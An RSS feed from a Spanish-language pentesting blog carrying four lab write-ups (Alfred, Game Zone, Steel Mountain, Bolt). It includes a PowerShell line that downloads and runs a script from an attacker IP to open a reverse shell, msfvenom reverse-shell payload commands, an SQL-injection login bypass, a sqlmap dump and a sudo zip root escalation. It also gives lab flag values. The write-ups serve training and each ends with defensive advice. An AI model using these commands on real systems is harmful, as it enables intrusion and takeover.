<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Pentesting on Gabriel Tello</title>
    <link>https://gtello.github.io/es/tags/pentesting/</link>
    <description>Recent content in Pentesting on Gabriel Tello</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es-EC</language>
    <managingEditor>gabrieltello10@hotmail.com (Gabriel Tello)</managingEditor>
    <webMaster>gabrieltello10@hotmail.com (Gabriel Tello)</webMaster>
    <copyright>[Gabriel Tello](https://github.com/gtello) © 2024</copyright>
    <lastBuildDate>Fri, 15 Nov 2024 15:30:00 +0000</lastBuildDate>
    <atom:link href="https://gtello.github.io/es/tags/pentesting/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Alfred (THM)</title>
      <link>https://gtello.github.io/es/writeups/alfred/</link>
      <pubDate>Fri, 15 Nov 2024 15:30:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/alfred/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Aquí tienes el writeup de la máquina &lt;a href=&#34;https://tryhackme.com/r/room/alfred&#34;&gt;Alfred&lt;/a&gt; en TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Vamos a ver cómo explotar una máquina Windows con un servicio Jenkins expuesto. Usando credenciales por defecto, logramos ejecutar comandos remotos a través de la funcionalidad de construcción de Jenkins y obtenimos un acceso inicial. A partir de ahí, escalamos privilegios utilizando técnicas de suplantación de tokens, alcanzando finalmente control administrativo total del sistema.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;&#xA;&lt;p&gt;Lo primero fue realizar un escaneo de red con &lt;code&gt;nmap&lt;/code&gt; para identificar puertos y servicios abiertos.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Aquí tienes el writeup de la máquina <a href="https://tryhackme.com/r/room/alfred">Alfred</a> en TryHackMe.</p>
<h2 id="resumen">Resumen</h2>
<p>Vamos a ver cómo explotar una máquina Windows con un servicio Jenkins expuesto. Usando credenciales por defecto, logramos ejecutar comandos remotos a través de la funcionalidad de construcción de Jenkins y obtenimos un acceso inicial. A partir de ahí, escalamos privilegios utilizando técnicas de suplantación de tokens, alcanzando finalmente control administrativo total del sistema.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Lo primero fue realizar un escaneo de red con <code>nmap</code> para identificar puertos y servicios abiertos.</p>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th>Sistema Operativo</th>
          <th>Dirección IP</th>
          <th>Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Windows Server</td>
          <td>10.10.149.26</td>
          <td>80, 3389, 8080</td>
      </tr>
  </tbody>
</table>
<p><img alt="Comando nmap y resultados" src="/images/posts/alfred/image1.png"></p>
<center><b>Comando nmap y resultados</b></center>
<p>Los puertos 80 y 8080 fueron analizados en el navegador. En el puerto 8080, encontré un portal de inicio de sesión de Jenkins, una herramienta ampliamente usada para CI/CD.</p>
<h2 id="explotación">Explotación</h2>
<p>¡Manos a la obra! Probé credenciales por defecto (<code>admin:admin</code>) en el portal de Jenkins, y sorpresa: funcionaron. Esto me dio acceso al dashboard.</p>
<p><img alt="Dashboard de Jenkins" src="/images/posts/alfred/image2.png"></p>
<center><b>Dashboard de Jenkins</b></center>
<p>En la configuración del proyecto, utilicé la sección &ldquo;Build&rdquo; para ejecutar comandos. Usé este <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">script</a> de PowerShell para establecer una reverse shell:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.6.5.62:8008/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.6</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">62</span> <span class="n">-Port</span> <span class="mf">4321</span></span></span></code></pre></div><p>Con la opción <strong>Build Now</strong>, conseguí conectarme exitosamente a la máquina objetivo desde mi terminal atacante.</p>
<p><img alt="Comando de reverse shell en Jenkins" src="/images/posts/alfred/image3.png"></p>
<center><b>Comando de reverse shell en Jenkins</b></center>  
<p><img alt="Acceso mediante reverse shell" src="/images/posts/alfred/image4.png"></p>
<center><b>Acceso mediante reverse shell</b></center>
<h2 id="escalación-de-privilegios">Escalación de Privilegios</h2>
<p>Una vez dentro de la máquina, generé un payload ejecutable para obtener una sesión de <code>meterpreter</code> utilizando <code>msfvenom</code>:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o revshell.exe</span></span></code></pre></div><p>Transferí el payload a la máquina objetivo utilizando <code>certutil</code> y lo ejecuté, estableciendo una conexión <code>meterpreter</code> con mi máquina atacante.</p>
<p><img alt="Configuración del receptor en Metasploit" src="/images/posts/alfred/image5.png"></p>
<center><b>Configuración del receptor en Metasploit</b></center>
<p>Revisando los privilegios del usuario, podemos ver que tenemos los permisos <code>SeDebugPrivilege</code> y <code>SeImpersonatePrivilege</code>. Estos permisos permiten suplantar tokens y acceder a procesos con permisos elevados. Utilicé el módulo <code>incognito</code> de Metasploit para explotarlos.</p>
<p><img alt="Uso del módulo incognito" src="/images/posts/alfred/image6.png"></p>
<center><b>Uso del módulo incognito</b></center>
<p>Finalmente, migré el proceso a un servicio con permisos <code>SYSTEM</code>, logrando control completo sobre la máquina.</p>
<p><img alt="Migración a un proceso privilegiado" src="/images/posts/alfred/image7.png"></p>
<center><b>Migración a un proceso privilegiado</b></center>
<h2 id="banderas">Banderas</h2>
<p>Con acceso administrativo, encontré las banderas:</p>
<ul>
<li><strong>user.txt</strong>: <code>79007a09481963edf2e1321abd9ae2a0</code></li>
<li><strong>root.txt</strong>: <code>dff0f748678f280250f25a45b8046b4a</code></li>
</ul>
<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
<table>
  <thead>
      <tr>
          <th>Herramienta</th>
          <th>Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>nmap</strong></td>
          <td>Escaneo de red y detección de servicios abiertos.</td>
      </tr>
      <tr>
          <td><strong>Jenkins</strong></td>
          <td>Plataforma explotada con credenciales por defecto para ejecutar comandos.</td>
      </tr>
      <tr>
          <td><strong>msfvenom/metasploit</strong></td>
          <td>Generación de payloads y escalación de privilegios con el módulo incognito.</td>
      </tr>
      <tr>
          <td><strong>certutil</strong></td>
          <td>Transferencia del payload a la máquina objetivo.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>La explotación del sistema Alfred reveló problemas críticos como servicios expuestos con credenciales por defecto y configuraciones incorrectas de privilegios, lo que permitió escalar hasta el nivel de administrador.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<ul>
<li><strong>Actualizar Jenkins</strong> y eliminar credenciales por defecto.</li>
<li>Configurar un <strong>firewall</strong> para restringir accesos innecesarios.</li>
<li>Implementar políticas de contraseñas robustas.</li>
<li>Limitar privilegios innecesarios en los usuarios.</li>
</ul>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Game Zone (THM)</title>
      <link>https://gtello.github.io/es/writeups/gamezone/</link>
      <pubDate>Thu, 14 Nov 2024 20:43:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/gamezone/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://tryhackme.com/r/room/gamezone&#34;&gt;Game Zone&lt;/a&gt; de TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Este writeup cubre la intrusión en un entorno web vulnerable, la obtención de acceso mediante SQL Injection, y la escalación de privilegios a root utilizando un exploit de Webmin. Incluye técnicas de recolección de datos, cracking de hashes y uso de herramientas como &lt;em&gt;nmap&lt;/em&gt;, &lt;em&gt;Burp Suite&lt;/em&gt;, &lt;em&gt;sqlmap&lt;/em&gt;, y &lt;em&gt;John the Ripper&lt;/em&gt;.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;&#xA;&lt;p&gt;El primer paso fue un escaneo de red con nmap para descubrir puertos y servicios activos.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Writeup de la máquina <a href="https://tryhackme.com/r/room/gamezone">Game Zone</a> de TryHackMe.</p>
<h2 id="resumen">Resumen</h2>
<p>Este writeup cubre la intrusión en un entorno web vulnerable, la obtención de acceso mediante SQL Injection, y la escalación de privilegios a root utilizando un exploit de Webmin. Incluye técnicas de recolección de datos, cracking de hashes y uso de herramientas como <em>nmap</em>, <em>Burp Suite</em>, <em>sqlmap</em>, y <em>John the Ripper</em>.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>El primer paso fue un escaneo de red con nmap para descubrir puertos y servicios activos.</p>
<p><img alt="Resultado nmap" src="/images/posts/gamezone/image1.png"> <center><b>Comando nmap y resultados</b></center></p>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th>Sistema Operativo</th>
          <th>Dirección IP</th>
          <th>Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Ubuntu 16.04.6</td>
          <td>10.10.254.53</td>
          <td>22 (SSH), 80 (HTTP)</td>
      </tr>
  </tbody>
</table>
<h2 id="explotación">Explotación</h2>
<p>Al encontrar el puerto 80 abierto, accedimos a la página de inicio de Game Zone desde el navegador.</p>
<p><img alt="Página de inicio de Game Zone" src="/images/posts/gamezone/image2.png"> <center><b>Página de inicio de Game Zone</b></center></p>
<p>El cuarto en TryHackMe invitaba a probar SQL Injection (SQLi) en el campo de login. Usando la sentencia <code>' or 1=1 limit 1;#</code> en el campo de usuario y dejando la contraseña en blanco, logramos autenticarnos exitosamente al portal. Sin embargo, al probar más inyecciones manualmente, no tuvimos resultados adicionales, así que decidimos capturar el <strong>POST request</strong> de la búsqueda con <strong>Burp Suite</strong> para con eso automatizar pruebas de SQLi con <strong>SQLmap</strong>.</p>
<p><img alt="Captura de POST request" src="/images/posts/gamezone/image3.png"> <center><b>Captura de POST request</b></center></p>
<p>Utilizamos el comando <code>sqlmap -r POST.txt --dump</code> para verificar y explotar vulnerabilidades de inyección SQL. SQLmap reveló la presencia de una base de datos MySQL y mostró el contenido de la tabla de <code>users</code> con contraseñas hasheadas. Aplicamos <strong>John the Ripper</strong> para descifrar el hash de la contraseña del usuario <code>agent47</code>.</p>
<p><img alt="Ejecución de SQLmap" src="/images/posts/gamezone/image4.png"> <center><b>Ejecución de SQLmap</b></center><br>
<img alt="Crack del hash" src="/images/posts/gamezone/image5.png"> <center><b>Crack del hash</b></center></p>
<p>Con las credenciales, logramos acceder a la máquina vía SSH.</p>
<p><img alt="Ingreso mediante ssh" src="/images/posts/gamezone/image6.png"> <center><b>Ingreso mediante ssh</b></center></p>
<h3 id="escalación-de-privilegios">Escalación de Privilegios</h3>
<p>Dentro de la máquina, ejecutamos <code>ss -tulpn</code> para identificar puertos y servicios adicionales. Observamos que el puerto 10000 estaba bloqueado por un firewall, así que configuramos un túnel SSH con <code>ssh -L 10000:127.0.0.1:10000 agent47@10.10.254.53</code>. Esto nos permitió acceder a un CMS llamado <strong>Webmin</strong>, versión 1.580.</p>
<p><img alt="Puerto 10000 bloqueado por firewall" src="/images/posts/gamezone/image7.png"> <center><b>Puerto 10000 bloqueado por firewall</b></center><br>
<img alt="Portal Webmin" src="/images/posts/gamezone/image8.png"> <center><b>Portal Webmin</b></center></p>
<p>Investigando posibles vulnerabilidades en Webmin, encontramos el exploit <a href="https://github.com/JohnHammond/CVE-2012-2982">CVE-2012-2982</a>. Al ejecutar este exploit, conseguimos acceso root en la máquina.</p>
<p><img alt="Uso de exploit" src="/images/posts/gamezone/image9.png"> <center><b>Uso de exploit</b></center><br>
<img alt="Acceso a usuario root" src="/images/posts/gamezone/image10.png"> <center><b>Acceso a usuario root</b></center></p>
<h2 id="banderas">Banderas</h2>
<p>Ya con privilegios de root, localizamos las dos banderas:</p>
<ul>
<li><code>user.txt</code>: 649ac17b1480ac13ef1e4fa579dac95c</li>
<li><code>root.txt</code>: a4b945830144bdd71908d12d902adeee</li>
</ul>
<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
<p>Durante este análisis, empleamos las siguientes herramientas:</p>
<table>
  <thead>
      <tr>
          <th>Herramienta</th>
          <th>Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>nmap</strong></td>
          <td>Escaneo de red y detección de puertos abiertos.</td>
      </tr>
      <tr>
          <td><strong>Burp Suite</strong></td>
          <td>Captura y análisis de solicitudes HTTP para SQLi automatizado.</td>
      </tr>
      <tr>
          <td><strong>sqlmap</strong></td>
          <td>Pruebas de SQLi y extracción de datos de la base de datos.</td>
      </tr>
      <tr>
          <td><strong>John the Ripper</strong></td>
          <td>Descifrado del hash de la contraseña del usuario <code>agent47</code> para acceso SSH.</td>
      </tr>
      <tr>
          <td><strong>Exploit CVE-2012-2982</strong></td>
          <td>Vulnerabilidad en Webmin que permitió escalación de privilegios a root.</td>
      </tr>
  </tbody>
</table>
<h2 id="recomendaciones">Recomendaciones</h2>
<ul>
<li><strong>Actualización de sistemas y aplicaciones críticas</strong>, especialmente Webmin y Ubuntu, para corregir vulnerabilidades conocidas.</li>
<li><strong>Restricciones de firewall</strong> en servicios internos y <strong>sanitización de inputs</strong> para prevenir inyecciones SQL.</li>
<li>Implementar un sistema de <strong>gestión de parches</strong> y fomentar el uso de <strong>contraseñas seguras</strong> para reducir el riesgo de escalación de privilegios.</li>
</ul>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Steel Mountain (THM)</title>
      <link>https://gtello.github.io/es/writeups/steelmountain/</link>
      <pubDate>Tue, 12 Nov 2024 22:40:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/steelmountain/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://www.tryhackme.com/room/steelmountain&#34;&gt;Steel Mountain&lt;/a&gt; de TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Encontramos varias vulnerabilidades que nos permitieron obtener acceso no autorizado al sistema. Primero, encontramos servicios en los puertos 80 y 8080 que exponían información sensible. Luego, usando un exploit en uno de estos servicios, conseguimos acceso al sistema con una reverse shell.&lt;/p&gt;&#xA;&lt;p&gt;Después, escalamos privilegios y logramos permisos de administrador gracias a una mala configuración de permisos en uno de los servicios del sistema, lo cual nos dio acceso a archivos críticos y nos permitió llegar hasta información confidencial.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Writeup de la máquina <a href="https://www.tryhackme.com/room/steelmountain">Steel Mountain</a> de TryHackMe.</p>
<h2 id="resumen">Resumen</h2>
<p>Encontramos varias vulnerabilidades que nos permitieron obtener acceso no autorizado al sistema. Primero, encontramos servicios en los puertos 80 y 8080 que exponían información sensible. Luego, usando un exploit en uno de estos servicios, conseguimos acceso al sistema con una reverse shell.</p>
<p>Después, escalamos privilegios y logramos permisos de administrador gracias a una mala configuración de permisos en uno de los servicios del sistema, lo cual nos dio acceso a archivos críticos y nos permitió llegar hasta información confidencial.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Empezamos con un escaneo de red con nmap para ver qué puertos estaban abiertos y qué servicios corrían en ellos.</p>
<div>
  <img src="/images/posts/steelmountain/image1.png" alt="Resultado nmap" />
</div>
<center><em>Figura 1:</em> Resultado nmap</center>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th>Sistema Operativo</th>
          <th>Dirección IP</th>
          <th>Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Windows Server 2008</td>
          <td>10.10.128.109</td>
          <td>80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
      </tr>
  </tbody>
</table>
<h2 id="explotación">Explotación</h2>
<p>Al investigar el puerto 80 en el navegador, encontramos la página de inicio de Steel Mountain con un &ldquo;Empleado del Mes&rdquo; llamado Bill Harper (nombre tomado del archivo de la imagen). En el puerto 8080, descubrimos un servidor Rejetto HTTP que estaba expuesto y vulnerable a un exploit de ejecución remota de comandos (Remote Command Execution) en la versión 2.3.x de HFS. Usamos metasploit para lanzar el exploit y obtener una conexión reverse shell en el servidor. En el escritorio del usuario se encuentra la primera bandera.</p>
<div style="text-align: center;">
  <img width="1000" src="/images/posts/steelmountain/image2.png" alt="steelmountain" />
</div>
<center><em>Figura 2:</em> Homepage de Steel Mountain</center>
<br>
<div style="text-align: center;">
  <img src="/images/posts/steelmountain/image3.png" alt="hfs http file server" />
</div>
<center><em>Figura 3:</em> Servidor Rejetto HTTP expuesto</center>
<br>
<div style="text-align: center;">
  <img src="/images/posts/steelmountain/image4.png" alt="shell metasploit" />
</div>
<center><em>Figura 4:</em> Shell obtenido en metasploit</center>
<h2 id="escalación-de-privilegios">Escalación de privilegios</h2>
<p>Con acceso inicial al sistema, ejecutamos el script <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> en PowerShell para buscar posibles problemas de configuración en el sistema Windows. El script detectó que el servicio <code>AdvancedSystemCareService9</code> tenía configuraciones de permisos mal configuradas:</p>
<ul>
<li>La ruta del servicio no tenía comillas y tenía espacios, lo que es vulnerable en Windows.</li>
<li>El servicio estaba configurado con permisos modificables, lo que permite a usuarios sin privilegios hacer cambios.</li>
</ul>
<div style="text-align: center;">
  <img width="1000" src="/images/posts/steelmountain/image5.png" alt="script powerup" />
</div>
<center><em>Figura 5:</em> Uso de script PowerUp</center>
<p>Creamos un payload de reverse shell con msfvenom usando el comando:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -e x86/shikata_ga_nai -f exe-service -o CleanupService.exe</span></span></code></pre></div><p>Este comando generó un ejecutable <code>CleanupService.exe</code> con un payload de revervse shell hacia nuestra máquina. Subimos este archivo al servidor, reemplazamos el ejecutable legítimo del servicio y lo reiniciamos con <code>sc stop</code> y <code>sc start</code>, ejecutando así nuestro payload y obteniendo acceso de administrador.</p>
<div style="text-align: center;">
  <img width="1000" src="/images/posts/steelmountain/image6.png" alt="ejecutable reemplazado" />
</div>
<center><em>Figura 6:</em> Ejecutable reemplazado</center>
<p>Una vez dentro del sistema se consiguió la bandera final.</p>
<div style="text-align: center;">
  <img src="/images/posts/steelmountain/image7_1.png" alt="acceso a system" /><br>
  <img src="/images/posts/steelmountain/image7_2.png" alt="bandera" />
</div>
<center><em>Figura 7:</em> Acceso a cuenta Administrador</center>
<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
<table>
  <thead>
      <tr>
          <th>Herramienta</th>
          <th>Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>nmap</td>
          <td>Para el reconocimiento inicial y detección de servicios y puertos abiertos.</td>
      </tr>
      <tr>
          <td>metasploit</td>
          <td>Para lanzar el exploit contra el servidor Rejetto HTTP.</td>
      </tr>
      <tr>
          <td>PowerUp.ps1</td>
          <td>Script de PowerShell para analizar configuraciones de privilegios en sistemas Windows.</td>
      </tr>
      <tr>
          <td>msfvenom</td>
          <td>Para generar el payload de reverse shell que ejecutamos para obtener permisos de administrador.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>Esta máquina era bastante vulnerable, con servicios web mal configurados y permisos inseguros en algunos servicios, lo que hizo relativamente fácil tanto el acceso inicial como la escalación de privilegios.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<p>Para mejorar la seguridad:</p>
<ol>
<li>Restringir el acceso a puertos no esenciales y limitar el acceso a IPs confiables.</li>
<li>Actualizar o reemplazar el servidor Rejetto HTTP para cerrar posibles vulnerabilidades.</li>
<li>Revisar y ajustar las configuraciones de servicios, asegurándose de que las rutas estén entre comillas y los permisos de modificación sean seguros.</li>
<li>Implementar monitoreo y control de accesos en tiempo real para detectar cualquier actividad no autorizada en el sistema.</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Máquina Bolt</title>
      <link>https://gtello.github.io/es/writeups/bolt/</link>
      <pubDate>Thu, 31 Oct 2024 18:03:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/bolt/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Debian.&#xD;&#xA;&lt;h2 id=&#34;resumen-ejecutivo&#34;&gt;Resumen ejecutivo&lt;/h2&gt;&#xA;&lt;p&gt;Este informe describe una evaluación de seguridad en la que se identificaron y explotaron varias vulnerabilidades críticas en la máquina Bolt. Durante el reconocimiento, se encontraron servicios expuestos, como un error en Bolt CMS y una página de información de PHP. Estos descubrimientos llevaron a la extracción de credenciales sensibles y a la explotación de una vulnerabilidad que permitió acceder a archivos importantes del sistema.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Debian.
<h2 id="resumen-ejecutivo">Resumen ejecutivo</h2>
<p>Este informe describe una evaluación de seguridad en la que se identificaron y explotaron varias vulnerabilidades críticas en la máquina Bolt. Durante el reconocimiento, se encontraron servicios expuestos, como un error en Bolt CMS y una página de información de PHP. Estos descubrimientos llevaron a la extracción de credenciales sensibles y a la explotación de una vulnerabilidad que permitió acceder a archivos importantes del sistema.</p>
<p>Además, se detectó un recurso compartido NFS que contenía un archivo protegido por contraseña. Mediante el uso de técnicas de fuerza bruta, se logró descifrar el archivo y obtener una clave SSH, lo que permitió acceder al sistema como un usuario identificado. Finalmente, se aprovechó una configuración de permisos incorrecta para elevar los privilegios y obtener acceso root al sistema, logrando control completo de la máquina.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Se realizó un escaneo de red utilizando la herramienta nmap para identificar puertos y servicios abiertos en la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image1.png" alt="Resultado nmap" />
</div>
<center><em>Figura 1:</em> Resultado nmap</center>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th>Sistema Operativo</th>
          <th>Dirección IP</th>
          <th>Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Debian</td>
          <td>192.168.138.132</td>
          <td>22 (SSH), 80 (HTTP), 111 (RPCbind), 2049 (NFS), 8080 (HTTP Alternate)</td>
      </tr>
  </tbody>
</table>
<h2 id="explotación">Explotación</h2>
<p>El escaneo de nmap mostró que el puerto 80 y 8080 estaba abierto, se procedió a investigar en el navegador. Se encontró una página de error, aparentemente de Bolt CMS.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image2.png" alt="error instalación bolt" />
</div>
<center><em>Figura 2:</em> Error de instalación de Bolt</center>
<p>En el puerto 8080 está expuesta una página de información de PHP. Se procedió a hacer fuerza bruta a los directorios de ambos puertos.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image3.png" alt="php info page" />
</div>
<center><em>Figura 3:</em> Página de información de PHP</center>
<p>En el puerto 8080 está expuesta una página de información de PHP. Se procedió a hacer fuerza bruta a los directorios de ambos puertos.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image4.png" alt="fuerza bruta a directorios" />
</div>
<center><em>Figura 4:</em> Fuerza bruta a directorios del puerto 80</center>
<p>Dentro del directorio /app, se encontró un archivo <code>config.yml</code> que contenía credenciales de SQLite.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image5.png" alt="credenciales expuestas" />
</div>
<center><em>Figura 5:</em> Credenciales expuestas en archivo config.yml</center>
<p>En cambio, los resultados de fuerza bruta en los directorios para el puerto 8080 retornaron un solo resultado, el cual fue el directorio <code>/dev</code>.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image6.png" alt="boltwire" />
</div>
<center><em>Figura 6:</em> Página de inicio de BoltWire</center>
<p>Se procedió a interactuar con la página de BoltWire, pero no se encontró nada de interés. Se buscaron vulnerabilidades en Internet y se probó una vulnerabilidad de <a href="https://www.exploit-db.com/exploits/48411">local file inclusion</a>.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image7.png" alt="LFI" />
</div>
<center><em>Figura 7:</em> Local file inclusion</center>
<p>El archivo <code>/etc/passwd</code> pudo ser examinado debido al LFI y se encontró un potencial usuario, <code>jeanpaul</code>.</p>
<p>Simultáneamente, se enumeró el puerto 2049 (NFS). Utilizando el comando <code>showmount -e</code> se reveló que el directorio <code>/srv/nfs</code> estaba compartido con rangos de IP específicos.</p>
<p>Luego, se creó un directorio local <code>/mnt/dev</code> para usarlo como punto de montaje. Posteriormente, se montó el recurso compartido NFS <code>/srv/nfs</code> de la máquina en el directorio local utilizando el comando <code>mount</code>. Al navegar a <code>/mnt/dev</code>, se descubrió un archivo llamado <code>save.zip</code>.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image8.png" alt="enumeración NFS" />
</div>
<center><em>Figura 8:</em> Enumeración de NFS</center>
<p>El archivo zip tiene una contraseña, se utilizó la herramienta <code>fcrackzip</code> con un diccionario de contraseñas (<code>rockyou.txt</code>) para intentar descifrar la contraseña del archivo <code>save.zip</code>. El comando tuvo éxito y reveló que la contraseña era <code>java101</code>.</p>
<p>A continuación, se descomprimió el archivo <code>save.zip</code> usando sudo unzip y se ingresó la contraseña descubierta. Esto extrajo tres archivos: <code>bandera1.txt</code>, <code>id_rsa</code>, y <code>todo.txt</code>.</p>
<p>El archivo <code>bandera1.txt</code> contenía una cadena hash, mientras que el archivo <code>todo.txt</code> incluía instrucciones relacionadas con la gestión del sitio web y una recomendación de seguir programando en Java, este archivo fue firmado por <code>jp</code> el cual podría ser el usuario <code>jeanpaul</code> encontrado anteriormente.</p>
<p>Debido a esto, se intentó usar el archivo <code>id_rsa</code> para conectarse a la máquina con el usuario <code>jeanpaul</code>, usando las credenciales ya conocidas hasta el momento.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image9.png" alt="crack de archivo zip" />
</div>
<center><em>Figura 9:</em> Crack del archivo zip</center>
<p>La contraseña encontrada en el archivo de configuración anteriormente fue la contraseña correcta para el usuario jeanpaul, una vez dentro de la máquina se procedió a escalar privilegios.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image10.png" alt="log in" />
</div>
<center><em>Figura 10:</em> Log in con usuario jeanpaul</center>
<h3 id="escalación-de-privilegios">Escalación de privilegios</h3>
<p>Con el uso del comando <code>sudo -l</code>, se observó que el usuario actual podía usar el comando <code>zip</code> como usuario root sin necesidad de una contraseña. Se utilizó una técnica de escalada de privilegios tomada de la página <a href="https://gtfobins.github.io/gtfobins/zip/#sudo">GTFObins</a>, la cual proporciona métodos para explotar binarios con permisos especiales mediante sudo. En este caso, se aprovechó del binario <code>zip</code> para ejecutar comandos con privilegios elevados.</p>
<p>El proceso comenzó con la creación de un archivo temporal mediante el comando <code>TF=$(mktemp -u)</code>, que generó un nombre de archivo único sin llegar a crear el archivo físicamente, almacenándolo en la variable <code>TF</code>. Luego, se ejecutó <code>zip</code> con privilegios de superusuario usando el comando <code>sudo zip $TF /etc/hosts -T -TT 'sh #'</code>. Aquí, <code>zip</code> fue configurado para ejecutar el intérprete de comandos <code>sh</code>, utilizando <code>/etc/hosts</code> como un archivo dummy solo para cumplir con los requerimientos del binario. Las opciones <code>-T</code> y <code>-TT</code> permitieron que <code>sh</code> se ejecutara con permisos elevados. Finalmente, se eliminó el archivo temporal con <code>sudo rm $TF</code> para limpiar los rastros del ataque. Esta secuencia permitió obtener acceso root a la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/bolt/image11.png" alt="escalada a root" />
</div>
<center><em>Figura 11:</em> Escalada a root</center>
<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
<table>
  <thead>
